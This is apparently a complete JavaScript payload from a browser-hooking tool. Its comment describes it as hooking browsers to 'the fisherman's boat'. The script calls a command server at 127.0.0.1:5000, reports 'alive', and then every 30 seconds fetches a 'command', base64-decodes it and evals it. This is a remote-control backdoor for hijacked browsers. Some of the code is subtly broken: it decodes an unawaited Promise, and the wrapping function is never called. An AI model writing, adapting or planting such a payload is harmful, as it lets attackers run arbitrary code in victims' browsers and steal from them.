/*
Default payload for hooking browsers to the fisherman's boat using fetch api
This payload if for non-persistent scripts that after eval'd can be thrown away
*/

(function() {
    async function sendRequest(page) {
        const res = await fetch(
            `http://127.0.0.1:5000/${page}`,
            {
                'mode' : 'no-cors',
                'method' : "POST"
            }
        );

        eval(atob(res.blob()));
    }

    sendRequest('alive');
    setInterval(() => { sendRequest('command') } , 30000);
})